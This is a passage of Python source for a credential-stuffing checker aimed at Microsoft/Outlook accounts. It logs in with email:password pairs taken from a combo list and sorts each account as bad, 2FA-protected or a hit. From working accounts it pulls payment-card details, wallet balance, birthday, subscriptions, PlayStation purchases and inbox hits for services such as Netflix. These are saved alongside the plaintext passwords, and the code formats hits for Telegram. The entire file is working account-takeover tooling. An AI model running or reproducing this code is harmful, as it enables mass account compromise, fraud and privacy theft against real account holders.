        "en-US": "United States", "en-GB": "United Kingdom", "en-CA": "Canada",
        "en-AU": "Australia", "en-NZ": "New Zealand", "en-IE": "Ireland",
        "en-IN": "India", "fr-FR": "France", "fr-BE": "Belgium", "fr-CH": "Switzerland",
        "fr-CA": "Canada", "de-DE": "Germany", "de-AT": "Austria", "de-CH": "Switzerland",
        "es-ES": "Spain", "es-MX": "Mexico", "es-AR": "Argentina", "es-CO": "Colombia",
        "pt-BR": "Brazil", "pt-PT": "Portugal", "it-IT": "Italy", "nl-NL": "Netherlands",
        "nl-BE": "Belgium", "ru-RU": "Russia", "zh-CN": "China", "zh-TW": "Taiwan",
        "ja-JP": "Japan", "ko-KR": "South Korea", "ar-SA": "Saudi Arabia",
        "tr-TR": "Turkey", "pl-PL": "Poland", "sv-SE": "Sweden", "da-DK": "Denmark",
        "fi-FI": "Finland", "nb-NO": "Norway", "cs-CZ": "Czech Republic",
        "hu-HU": "Hungary", "ro-RO": "Romania", "uk-UA": "Ukraine", "el-GR": "Greece",
        "he-IL": "Israel", "th-TH": "Thailand", "id-ID": "Indonesia", "ms-MY": "Malaysia",
        "vi-VN": "Vietnam", "fa-IR": "Iran",
    }

    def _get_token_for_scope(self, refresh_token: str, scope: str) -> str:
        try:
            r = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data={
                    "client_id": self.client_id,
                    "grant_type": "refresh_token",
                    "refresh_token": refresh_token,
                    "scope": scope,
                },
                timeout=8
            )
            if r.status_code == 200:
                return r.json().get("access_token", "")
        except Exception:
            pass
        return ""

    def get_account_profile(self, token, id_token="", refresh_token=""):
        name = "N/A"
        region = "N/A"

        # 1. Extract from id_token JWT claims
        if id_token:
            claims = self._decode_id_token(id_token)
            name = claims.get("name") or claims.get("given_name") or "N/A"
            locale = claims.get("locale") or ""
            if locale:
                region = self.LOCALE_TO_COUNTRY.get(locale, locale)

        # 2. OWA GetUserConfiguration
        try:
            owa_headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": self.ua,
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
            r = self.session.post(
                "https://outlook.live.com/owa/service.svc?action=GetUserConfiguration&EP=1",
                headers=owa_headers,
                json={
                    "__type": "GetUserConfigurationRequest:#Exchange",
                    "Header": {
                        "__type": "JsonRequestHeaders:#Exchange",
                        "RequestServerVersion": "V2018_01_08"
                    }
                },
                timeout=6
            )
            if r.status_code == 200:
                d = r.json()
                owa_locale = (
                    d.get("UserOptions", {}).get("LocaleInfo", {}).get("LocaleName") or
                    d.get("OwaUserConfiguration", {}).get("SessionSettings", {}).get("UserCulture") or
                    d.get("SessionSettings", {}).get("UserCulture") or ""
                )
                country_raw = (
                    d.get("UserOptions", {}).get("LocaleInfo", {}).get("DisplayName") or
                    d.get("OwaUserConfiguration", {}).get("SessionSettings", {}).get("UserCountry") or
                    d.get("SessionSettings", {}).get("UserCountry") or ""
                )
                if country_raw:
                    region = country_raw
                elif owa_locale and region == "N/A":
                    region = self.LOCALE_TO_COUNTRY.get(owa_locale, owa_locale)
        except Exception:
            pass

        # 3. Microsoft Graph — extended profile fields
        if region == "N/A" or name == "N/A":
            try:
                r = self.session.get(
                    "https://graph.microsoft.com/v1.0/me"
                    "?$select=displayName,country,usageLocation,city,state,preferredLanguage",
                    headers={"Authorization": f"Bearer {token}", "User-Agent": "Outlook-Android/2.0"},
                    timeout=6
                )
                if r.status_code == 200:
                    d = r.json()
                    if name == "N/A":
                        name = d.get("displayName") or "N/A"
                    if region == "N/A":
                        country = d.get("country") or d.get("usageLocation") or ""
                        if country:
                            region = country
                    if region == "N/A":
                        lang = d.get("preferredLanguage") or ""
                        if lang:
                            region = self.LOCALE_TO_COUNTRY.get(lang, "")
            except Exception:
                pass

        # 4. Graph mailboxSettings — timezone/language fallback
        if region == "N/A":
            try:
                r = self.session.get(
                    "https://graph.microsoft.com/v1.0/me/mailboxSettings",
                    headers={"Authorization": f"Bearer {token}", "User-Agent": "Outlook-Android/2.0"},
                    timeout=6
                )
                if r.status_code == 200:
                    d = r.json()
                    lang = d.get("language", {}).get("locale") or ""
                    tz = d.get("timeZone") or ""
                    if lang:
                        region = self.LOCALE_TO_COUNTRY.get(lang, lang)
                    elif tz:
                        tz_match = re.search(r'^(\w+(?:\s\w+)?)\s+Standard\s+Time', tz)
                        if tz_match:
                            region = tz_match.group(1)
            except Exception:
                pass

        # 5. Microsoft Account API with refresh_token scoped token
        if (region == "N/A" or name == "N/A") and refresh_token:
            for scope in ["https://account.microsoft.com/.default", "wl.basic wl.emails wl.signin"]:
                acct_token = self._get_token_for_scope(refresh_token, scope)
                if not acct_token:
                    continue
                try:
                    r = self.session.get(
                        "https://api.account.microsoft.com/v1.0/users/me",
                        headers={
                            "Authorization": f"Bearer {acct_token}",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                            "Accept": "application/json",
                        },
                        timeout=6
                    )
                    if r.status_code == 200:
                        d = r.json()
                        if name == "N/A":
                            name = d.get("displayName") or d.get("firstName") or "N/A"
                        if region == "N/A":
                            c = d.get("country") or d.get("usageLocation") or d.get("preferredLanguage") or ""
                            if c:
                                region = self.LOCALE_TO_COUNTRY.get(c, c)
                        if name != "N/A" and region != "N/A":
                            break
                except Exception:
                    continue

        return {"name": name, "region": region}

    def get_payment_methods(self, token, refresh_token=""):
        desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        def _try_endpoints(auth_token, ua=None):
            found = []
            h = {
                "Authorization": f"Bearer {auth_token}",
                "User-Agent": ua or "Outlook-Android/2.0",
                "Accept": "application/json",
            }
            endpoints = [
                "https://api.account.microsoft.com/users/me/paymentInstruments",
                "https://wallet.microsoft.com/api/v1/me/paymentInstruments",
                "https://account.microsoft.com/api/v1/paymentInstruments",
                "https://account.microsoft.com/api/v2/paymentInstruments",
                "https://api.account.microsoft.com/v1.0/users/me/paymentInstruments",
            ]
            for url in endpoints:
                try:
                    r = self.session.get(url, headers=h, timeout=6)
                    if r.status_code == 200:
                        data = r.json()
                        items = (data if isinstance(data, list)
                                 else data.get("value",
                                 data.get("paymentInstruments",
                                 data.get("items", []))))
                        for item in items:
                            kind = item.get("type") or item.get("instrumentType") or "Card"
                            last4 = item.get("lastFourDigits") or item.get("last4") or ""
                            brand = (item.get("brand") or item.get("cardType")
                                     or item.get("network") or "")
                            expiry = item.get("expirationDate") or item.get("expiry") or ""
                            parts = [p for p in [brand, kind, f"****{last4}" if last4 else ""] if p]
                            entry = " ".join(parts)
                            if expiry:
                                entry += f" exp:{str(expiry)[:7]}"
                            if entry and entry not in found:
                                found.append(entry)
                        if found:
                            break
                except Exception:
                    continue
            return found

        # 1. Try with the current Outlook token
        result = _try_endpoints(token)
        if result:
            return result

        # 2. Try scoped tokens from refresh_token
        if refresh_token:
            for scope in [
                "https://account.microsoft.com/.default",
                "service::account.microsoft.com::MBI_SSL",
                "https://wallet.microsoft.com/.default",
            ]:
                scoped = self._get_token_for_scope(refresh_token, scope)
                if scoped:
                    result = _try_endpoints(scoped, desktop_ua)
                    if result:
                        return result

        return ["N/A"]

    def _classify_sku(self, sku: str) -> str:
        s = sku.upper()
        if any(k in s for k in ("GAME_PASS", "GAMEPASS", "XBOXPASS", "XBOX_PASS", "XGPU", "XGPC", "XGPCORE")):
            if any(k in s for k in ("ULTIMATE", "XGPU")):
                return "Xbox Game Pass Ultimate"
            if any(k in s for k in ("PC", "PCGAME", "XGPC")):
                return "Xbox Game Pass for PC"
            if any(k in s for k in ("CORE", "XGPCORE")):
                return "Xbox Game Pass Core"
            if "CONSOLE" in s:
                return "Xbox Game Pass Console"
            return "Xbox Game Pass"
        if any(k in s for k in ("OFFICE", "O365")):
            if "BUSINESS" in s:
                return "Office 365 Business"
            return "Office 365"
        if any(k in s for k in ("M365", "MICROSOFT365")):
            return "Microsoft 365"
        if any(k in s for k in ("POWER_BI", "POWERBI")):
            return "Power BI"
        if "VISIO" in s:
            return "Visio"
        if "PROJECT" in s:
            return "Project"
        return sku

    def _get_xbox_auth(self, access_token: str):
        """Exchange MS access token for Xbox Live XSTS token. Returns (xsts_token, user_hash)."""
        try:
            r1 = self.session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": f"d={access_token}",
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT",
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=10,
            )
            if r1.status_code != 200:
                return None, None
            xbl_data = r1.json()
            xbl_token = xbl_data["Token"]
            user_hash = xbl_data["DisplayClaims"]["xui"][0]["uhs"]
        except Exception:
            return None, None

        try:
            r2 = self.session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [xbl_token],
                    },
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT",
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=10,
            )
            if r2.status_code != 200:
                return None, None
            xsts_token = r2.json()["Token"]
            return xsts_token, user_hash
        except Exception:
            return None, None

    def _check_xbox_gamepass_api(self, access_token: str) -> List[str]:
        """Query Xbox Live subscription APIs to detect active Game Pass tiers."""
        results: List[str] = []
        xsts_token, user_hash = self._get_xbox_auth(access_token)
        if not xsts_token or not user_hash:
            return results

        auth_header = f"XBL3.0 x={user_hash};{xsts_token}"
        headers = {
            "Authorization": auth_header,
            "x-xbl-contract-version": "8",
            "Accept": "application/json",
            "Accept-Language": "en-US",
        }

        # Primary: Xbox subscription endpoint
        try:
            r = self.session.get(
                "https://subscription.mp.microsoft.com/v2.0/users/me/subscriptions",
                headers=headers,
                timeout=10,
            )
            if r.status_code == 200:
                data = r.json()
                subs = (data.get("subscriptions") or data.get("items") or
                        data.get("value") or [])
                for sub in subs:
                    status = str(sub.get("status") or sub.get("subscriptionStatus") or "").lower()
                    if status in ("cancelled", "expired", "disabled"):
                        continue
                    name = (sub.get("productName") or sub.get("displayName") or
                            sub.get("friendlyName") or "")
                    if name and name not in results:
                        results.append(name)
        except Exception:
            pass

        if results:
            return results

        # Fallback: Xbox licensing / entitlements
        try:
            r2 = self.session.get(
                "https://licensing.mp.microsoft.com/v8.0/users/me/containers/ids",
                headers={**headers, "x-xbl-contract-version": "8"},
                timeout=10,
            )
            if r2.status_code == 200:
                data = r2.json()
                containers = data.get("containers") or data.get("value") or []
                gp_skus = {
                    "xgpu": "Xbox Game Pass Ultimate",
                    "xgppc": "Xbox Game Pass for PC",
                    "xgpcore": "Xbox Game Pass Core",
                    "xgpconsole": "Xbox Game Pass Console",
                    "game_pass_ultimate": "Xbox Game Pass Ultimate",
                    "game_pass_pc": "Xbox Game Pass for PC",
                    "game_pass_core": "Xbox Game Pass Core",
                }
                for c in containers:
                    cid = str(c.get("id") or c.get("containerId") or "").lower()
                    for key, label in gp_skus.items():
                        if key in cid and label not in results:
                            results.append(label)
        except Exception:
            pass

        return results

    def _get_graph_subscriptions(self, token: str) -> List[str]:
        results: List[str] = []
        headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
        try:
            r = self.session.get(
                "https://graph.microsoft.com/v1.0/me/subscribedSkus",
                headers=headers, timeout=8
            )
            if r.status_code == 200:
                for item in r.json().get("value", []):
                    sku = item.get("skuPartNumber", "")
                    if sku:
                        name = self._classify_sku(sku)
                        if name not in results:
                            results.append(name)
        except Exception:
            pass
        try:
            r2 = self.session.get(
                "https://subscriptions.microsoft.com/v1/me/entitlements",
                headers=headers, timeout=8
            )
            if r2.status_code == 200:
                for item in r2.json().get("entitlements", []):
                    name = item.get("friendlyName", "")
                    if name and name not in results:
                        results.append(name)
        except Exception:
            pass
        return results

    def get_microsoft_subscriptions(self, refresh_token=""):
        subscriptions = []
        desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        def _parse_services_json(data):
            found = []
            if isinstance(data, list):
                items = data
            else:
                items = (data.get("services") or data.get("Services") or
                         data.get("subscriptions") or data.get("Subscriptions") or
                         data.get("value") or data.get("items") or [])
                if not items:
                    for v in data.values():
                        if isinstance(v, list) and v:
                            items = v
                            break
            for item in items:
                if not isinstance(item, dict):
                    continue
                status = (item.get("status") or item.get("State") or
                          item.get("subscriptionStatus") or "")
                if str(status).lower() in ("cancelled", "expired", "disabled"):
                    continue
                sname = (item.get("productName") or item.get("friendlyName") or
                         item.get("name") or item.get("ProductName") or
                         item.get("SubscriptionName") or item.get("displayName") or "")
                if sname and sname not in found:
                    found.append(sname)
            return found

        api_urls = [
            "https://account.microsoft.com/api/v2/getServices",
            "https://account.microsoft.com/api/services",
            "https://account.microsoft.com/api/v1/getServices",
            "https://account.microsoft.com/api/v2/subscriptions",
            "https://account.microsoft.com/api/v1/subscriptions",
            "https://api.account.microsoft.com/v1.0/users/me/subscriptions",
        ]

        if refresh_token:
            # Try Xbox Live API first — most accurate source for Game Pass
            for xbox_scope in [
                "https://xboxlive.com/.default",
                "service::xboxlive.com::MBI_SSL",
                "Xboxlive.signin Xboxlive.offline_access",
            ]:
                xbox_token = self._get_token_for_scope(refresh_token, xbox_scope)
                if xbox_token:
                    xbox_subs = self._check_xbox_gamepass_api(xbox_token)
                    if xbox_subs:
                        return xbox_subs
                    break

            # Try Graph API (reliable for Office/M365 SKUs)
            graph_token = self._get_token_for_scope(
                refresh_token, "https://graph.microsoft.com/.default"
            )
            if graph_token:
                graph_subs = self._get_graph_subscriptions(graph_token)
                if graph_subs:
                    return graph_subs

            for scope in [
                "https://account.microsoft.com/.default",
                "service::account.microsoft.com::MBI_SSL",
                "wl.basic wl.emails wl.signin",
            ]:
                acct_token = self._get_token_for_scope(refresh_token, scope)
                if not acct_token:
                    continue
                auth_headers = {
                    "Authorization": f"Bearer {acct_token}",
                    "User-Agent": desktop_ua,
                    "Accept": "application/json",
                }
                for api_url in api_urls:
                    try:
                        ar = self.session.get(api_url, headers=auth_headers, timeout=8)
                        if ar.status_code == 200:
                            parsed = _parse_services_json(ar.json())
                            if parsed:
                                return parsed
                    except Exception:
                        continue

        # Fallback: load the services page and scrape or call API sessionlessly
        try:
            sso_r = self.session.get(
                "https://account.microsoft.com/services",
                headers={"User-Agent": desktop_ua, "Accept": "text/html,*/*"},
                timeout=12,
                allow_redirects=True
            )
            if sso_r.status_code == 200:
                api_headers = {"User-Agent": desktop_ua, "Accept": "application/json"}
                for api_url in api_urls[:4]:
                    try:
                        ar = self.session.get(api_url, headers=api_headers, timeout=8)
                        if ar.status_code == 200:
                            parsed = _parse_services_json(ar.json())
                            if parsed:
                                return parsed
                    except Exception:
                        continue

                page_text = sso_r.text
                for pat in [
                    r'"productName"\s*:\s*"([^"]{3,80})"',
                    r'"friendlyName"\s*:\s*"([^"]{3,80})"',
                    r'"SubscriptionName"\s*:\s*"([^"]{3,80})"',
                    r'"subscriptionName"\s*:\s*"([^"]{3,80})"',
                    r'"displayName"\s*:\s*"([^"]{3,80})"',
                ]:
                    for match in re.findall(pat, page_text):
                        if match not in subscriptions:
                            subscriptions.append(match)
                if subscriptions:
                    return list(dict.fromkeys(subscriptions))
        except Exception:
            pass

        return ["N/A"]

    def get_wallet_balance(self, token, refresh_token=""):
        desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        def _try(auth_token):
            h = {
                "Authorization": f"Bearer {auth_token}",
                "User-Agent": desktop_ua,
                "Accept": "application/json",
            }
            for url in [
                "https://api.account.microsoft.com/users/me/wallet",
                "https://account.microsoft.com/api/v1/wallet",
                "https://account.microsoft.com/api/v2/wallet",
                "https://account.microsoft.com/api/v1/walletBalance",
            ]:
                try:
                    r = self.session.get(url, headers=h, timeout=6)
                    if r.status_code == 200:
                        d = r.json()
                        amount = (d.get("balance") or d.get("amount") or
                                  d.get("totalBalance") or d.get("availableBalance") or "")
                        currency = d.get("currency") or d.get("currencyCode") or ""
                        if amount not in ("", None, 0, "0"):
                            return f"{amount} {currency}".strip()
                except Exception:
                    continue
            return ""

        result = _try(token)
        if result:
            return result
        if refresh_token:
            for scope in ["https://account.microsoft.com/.default",
                          "service::account.microsoft.com::MBI_SSL"]:
                scoped = self._get_token_for_scope(refresh_token, scope)
                if scoped:
                    result = _try(scoped)
                    if result:
                        return result
        return ""

    def get_birthday(self, token, cid):
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            r = self.session.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=headers, timeout=8
            )
            if r.status_code == 200:
                data = r.json()
                bday = (data.get("birthday") or data.get("birthDate") or
                        data.get("dateOfBirth") or "")
                if bday:
                    date_str = bday.split("T")[0]
                    birth_date = datetime.strptime(date_str, "%Y-%m-%d")
                    today = datetime.now()
                    age = (today.year - birth_date.year -
                           ((today.month, today.day) < (birth_date.month, birth_date.day)))
                    return {"birthday": birth_date.strftime("%Y-%m-%d"), "age": str(age)}
        except Exception:
            pass
        return {"birthday": "", "age": ""}

    def check_psn_purchases(self, token, cid):
        try:
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": (
                        "from:sony@txn-email.playstation.com OR "
                        "from:sony@email02.account.sony.com OR "
                        "\"PlayStation Order\" OR \"Your PlayStation order\""
                    )},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Content-Type": "application/json",
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload, headers=headers, timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                try:
                    result_set = data["EntitySets"][0]["ResultSets"][0]
                    total_orders = result_set.get("Total", 0)
                    for item in result_set.get("Results", [])[:10]:
                        purchase = {}
                        preview = item.get("Preview", "")
                        for pattern in [
                            r"Thank you for purchasing\s+([^\.]+)",
                            r"You've bought\s+([^\.]+)",
                            r"purchased\s+([^\.]+)",
                            r"Game:\s*([^\n]+)",
                        ]:
                            match = re.search(pattern, preview, re.IGNORECASE)
                            if match:
                                purchase["item"] = match.group(1).strip()[:60]
                                break
                        price_match = re.search(r"[\$€£¥]\s*\d+[\.,]\d{2}", preview)
                        if price_match:
                            purchase["price"] = price_match.group(0)
                        recv = (item.get("ReceivedTime") or
                                item.get("Source", {}).get("DateTimeReceived", ""))
                        if recv:
                            try:
                                date_obj = datetime.fromisoformat(recv.replace("Z", "+00:00"))
                                purchase["date"] = date_obj.strftime("%Y-%m-%d")
                            except Exception:
                                pass
                        if purchase.get("item"):
                            purchases.append(purchase)
                except (KeyError, IndexError):
                    pass
                return {"psn_orders": total_orders, "purchases": purchases}
        except Exception:
            pass
        return {"psn_orders": 0, "purchases": []}

    def search_emails_by_sender(self, token, cid, email, password, id_token="", refresh_token=""):
        url = "https://outlook.live.com/search/api/v2/query?n=400&cv=tNZ1DVP5NhDwG%2FDUCelaIu.400"
        query_string = " OR ".join(f"from:{pattern}" for pattern in SENDER_PATTERNS)

        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": query_string},
                "Size": 400,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                "EnableTopResults": False
            }],
            "AnswerEntityRequests": [],
            "QueryAlterationOptions": {"EnableSuggestion": False, "EnableAlteration": False}
        }

        headers = {
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Connection": "keep-alive"
        }

        profile = self.get_account_profile(token, id_token, refresh_token=refresh_token)
        payment_methods = self.get_payment_methods(token, refresh_token=refresh_token)
        ms_subscriptions = self.get_microsoft_subscriptions(refresh_token=refresh_token)
        balance = self.get_wallet_balance(token, refresh_token=refresh_token)
        birthday_info = self.get_birthday(token, cid)
        psn_info = self.check_psn_purchases(token, cid)

        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=8)
            if r.status_code == 200:
                data = r.json()
                try:
                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
                except (KeyError, IndexError):
                    results = []

                platform_counts = {}
                platform_subjects: Dict[str, List[str]] = {}
                hit_details = []

                for item in results:
                    source = item.get('Source', {})
                    subject = source.get('Subject') or "No Subject"

                    sender_address = "Unknown"
                    if 'Sender' in source and 'EmailAddress' in source['Sender']:
                        sender_address = source['Sender']['EmailAddress'].get('Address', 'Unknown')

                    platform = resolve_sender_platform(sender_address)
                    platform_counts[platform] = platform_counts.get(platform, 0) + 1
                    if platform not in platform_subjects:
                        platform_subjects[platform] = []
                    platform_subjects[platform].append(subject)
                    hit_details.append({"sender": sender_address, "subject": subject})

                platform_subscriptions: Dict[str, str] = {}
                for plat in PREMIUM_PLATFORMS:
                    if plat in platform_subjects:
                        tier = detect_subscription(plat, platform_subjects[plat])
                        platform_subscriptions[plat] = tier if tier else "✓"

                status = "HIT" if results else "FREE"
                return {
                    "status": status,
                    "platform_counts": platform_counts,
                    "platform_subscriptions": platform_subscriptions,
                    "details": hit_details[:10],
                    "name": profile["name"],
                    "region": profile["region"],
                    "payment_methods": payment_methods,
                    "ms_subscriptions": ms_subscriptions,
                    "balance": balance,
                    "birthday": birthday_info.get("birthday", ""),
                    "age": birthday_info.get("age", ""),
                    "psn_orders": psn_info.get("psn_orders", 0),
                    "psn_purchases": psn_info.get("purchases", []),
                }
            else:
                return {"status": "ERROR_API"}
        except Exception:
            return {"status": "ERROR_API"}

    def check_account(self, email, password):
        # Acquire session from pool; always return it afterwards
        self.session = session_pool.get_session()
        try:
            return self._do_check(email, password)
        finally:
            session_pool.return_session(self.session)
            self.session = None

    def _do_check(self, email, password):
        self.session.cookies.clear()
        try:
            # --- STEP 1: AUTH INIT ---
            url_auth = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                f"?client_info=1&haschrome=1&login_hint={urllib.parse.quote(email)}"
                f"&client_id={self.client_id}&mkt=en&response_type=code"
                f"&redirect_uri={urllib.parse.quote(self.redirect_uri)}"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            )
            headers = {"User-Agent": self.ua, "Connection": "keep-alive"}

            r1 = self.session.get(url_auth, headers=headers, allow_redirects=False, timeout=8)
            if r1.status_code != 302 or "Location" not in r1.headers:
                return "ERROR_NET"

            next_url = r1.headers["Location"]
            r2 = self.session.get(next_url, headers=headers, allow_redirects=False, timeout=8)

            ppft = self.extract_ppft(r2.text)
            url_post = (
                self.get_regex(self.URLPOST_PATTERN1, r2.text) or
                self.get_regex(self.URLPOST_PATTERN2, r2.text)
            )

            if not ppft or not url_post:
                return "ERROR_PARAMS"

            # --- STEP 2: LOGIN ---
            data_login = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "ps": "2",
                "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
            }
            headers_post = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.ua,
                "Connection": "keep-alive"
            }
            r3 = self.session.post(url_post, data=data_login, headers=headers_post,
                                   allow_redirects=False, timeout=8)

            r3_text_lower = r3.text.lower()
            bad_keywords = [
                "incorrect", "that microsoft account doesn't exist",
                "account doesn't exist", "no account found",
                "sign in to your microsoft account",
                "your account or password is incorrect",
                "we couldn't find an account",
            ]
            if any(kw in r3_text_lower for kw in bad_keywords):
                return "BAD"

            # --- STEP 3: OAUTH REDIRECT ---
            if r3.status_code == 302 and "Location" in r3.headers:
                oauth_url = r3.headers["Location"]
            else:
                uaid = (
                    self.get_regex(self.UAID_PATTERN1, r3.text) or
                    self.get_regex(self.UAID_PATTERN2, r3.text)
                )
                opid = self.get_regex(self.OPID_PATTERN, r3.text)
                opidt = self.get_regex(self.OPIDT_PATTERN, r3.text) or ""

                if uaid and opid:
                    oauth_url = (
                        f"https://login.live.com/oauth20_authorize.srf"
                        f"?uaid={uaid}&client_id={self.client_id}"
                        f"&opid={opid}&mkt=EN-US&opidt={opidt}"
                        f"&res=success&route=C105_BAY"
                    )
                else:
                    twofa_keywords = [
                        "verification", "verify", "confirm", "two-step",
                        "authenticator", "phone number", "email code",
                        "prove it", "security info", "unusual activity",
                    ]
                    if any(kw in r3_text_lower for kw in twofa_keywords):
                        return "2FA"
                    return "BAD"

            # --- STEP 4: GET CODE ---
            code = None
            if oauth_url.startswith("msauth://"):
                code = self.get_regex(self.CODE_PATTERN, oauth_url)
            else:
                r4 = self.session.get(oauth_url, allow_redirects=False, timeout=8)
                location = r4.headers.get("Location", "")
                code = self.get_regex(self.CODE_PATTERN, location)

            if not code:
                return "2FA"

            # --- STEP 5: GET TOKEN ---
            data_token = {
                "client_info": "1",
                "client_id": self.client_id,
                "redirect_uri": self.redirect_uri,
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r5 = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=data_token, timeout=8
            )

            if r5.status_code == 200:
                token_data = r5.json()
                token = token_data.get("access_token", "")
                id_token = token_data.get("id_token", "")
                refresh_token = token_data.get("refresh_token", "")
                mspcid = self.session.cookies.get("MSPCID", "")
                cid = mspcid.upper() if mspcid else "0000000000000000"

                return self.search_emails_by_sender(
                    token, cid, email, password,
                    id_token=id_token, refresh_token=refresh_token
                )
            else:
                return "ERROR_TOKEN"

        except requests.exceptions.Timeout:
            return "ERROR_TIMEOUT"
        except Exception:
            return "ERROR_SYS"


# ================= RESULT MANAGER =================
class ResultManager:
    def __init__(self, combo_filename, base_dir=None):
        if base_dir is None:
            base_dir = RESULT_BASE_DIR
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = re.sub(r'[^\w\-.]', '_', combo_filename)
        self.base_folder = os.path.join(base_dir, f"({timestamp})_{safe_name}_multi_hits")
        self.hits_file  = os.path.join(self.base_folder, "hits.txt")
        self.valid_file = os.path.join(self.base_folder, "valid.txt")
        self.xboxgp_file = os.path.join(self.base_folder, "xboxgp.txt")
        self.free_file  = os.path.join(self.base_folder, "free.txt")
        self.services_folder = os.path.join(self.base_folder, "services")
        Path(self.services_folder).mkdir(parents=True, exist_ok=True)

    @staticmethod
    def _build_premium_str(platform_subscriptions, platform_counts, separator=" | "):
        premium_order = ["Netflix", "PlayStation", "Crunchyroll", "TikTok", "Facebook", "Instagram"]
        parts = []
        for plat in premium_order:
            if plat in platform_subscriptions:
                emoji = PLATFORM_EMOJIS.get(plat, "✅")
                tier = platform_subscriptions[plat]
                count = platform_counts.get(plat, 0)
                if tier and tier != "✓":
                    parts.append(f"{emoji} {plat} [{tier}] ({count})")
                else:
                    parts.append(f"{emoji} {plat} ({count})")
        return separator.join(parts)

    @staticmethod
    def _format_entry(email, password, result_data):
        name = result_data.get("name", "N/A") if result_data else "N/A"
        region = result_data.get("region", "N/A") if result_data else "N/A"
        balance = result_data.get("balance", "") if result_data else ""
        payment_methods = result_data.get("payment_methods", ["N/A"]) if result_data else ["N/A"]
        payment_str = " / ".join(payment_methods)
        ms_subs = result_data.get("ms_subscriptions", ["N/A"]) if result_data else ["N/A"]
        subs_str = ", ".join(ms_subs)
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        platform_subscriptions = result_data.get("platform_subscriptions", {}) if result_data else {}
        birthday = result_data.get("birthday", "") if result_data else ""
        age = result_data.get("age", "") if result_data else ""
        psn_orders = result_data.get("psn_orders", 0) if result_data else 0
        psn_purchases = result_data.get("psn_purchases", []) if result_data else []

        inbox_str = (
            ", ".join([f"{p}: {c}" for p, c in sorted(platform_counts.items())])
            if platform_counts else "N/A"
        )

        sep = "-" * 60

        name_val = name if name and name != "N/A" else "N/A"
        region_val = region if region and region != "N/A" else "N/A"
        subs_val = subs_str if subs_str and subs_str != "N/A" else "N/A"
        payment_val = payment_str if payment_str and payment_str != "N/A" else "N/A"

        line1 = f"{email}:{password} | {name_val} | {region_val} | subscriptions: {subs_val} | Payment: {payment_val}"
        lines = [line1]

        if inbox_str and inbox_str != "N/A":
            lines.append(f"inbox: {inbox_str}")

        lines.append(sep)
        return "\n".join(lines) + "\n"

    @staticmethod
    def _format_telegram_hit(email, password, result_data):
        name = result_data.get("name", "") if result_data else ""
        region = result_data.get("region", "") if result_data else ""
        balance = result_data.get("balance", "") if result_data else ""
        payment_methods = result_data.get("payment_methods", []) if result_data else []
        ms_subs = result_data.get("ms_subscriptions", []) if result_data else []
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        platform_subscriptions = result_data.get("platform_subscriptions", {}) if result_data else {}
        birthday = result_data.get("birthday", "") if result_data else ""
        age = result_data.get("age", "") if result_data else ""
        psn_orders = result_data.get("psn_orders", 0) if result_data else 0
